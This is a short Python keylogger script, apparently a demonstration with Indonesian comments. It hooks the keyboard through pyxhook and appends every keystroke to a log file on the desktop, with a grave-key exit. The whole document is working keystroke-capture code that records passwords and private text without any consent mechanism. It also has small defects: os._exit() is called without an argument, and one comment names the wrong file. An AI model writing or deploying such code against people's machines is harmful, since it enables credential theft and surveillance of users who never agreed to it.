import pyxhook
import os


#get("keyboard_log_file") -> Jikalau ada environment variables
key_log_file = os.environ.get("keyboard_log_file", os.path.expanduser("~/Desktop/keylogger.log"))

def onKeyDown(event):
    # Kita contohkan, kalo kita menekan tombol ` maka program akan keluar
    if(event.Key == 'grave'):
        os._exit()
    with open(key_log_file, 'a') as f :
        #membuka file mouse_log_file dengan mode a (append)
        f.write('{}\n'.format(event.Key))


hook = pyxhook.HookManager()
hook.KeyDown = onKeyDown
hook.HookKeyboard()

try:
    hook.start()
except :
    pass
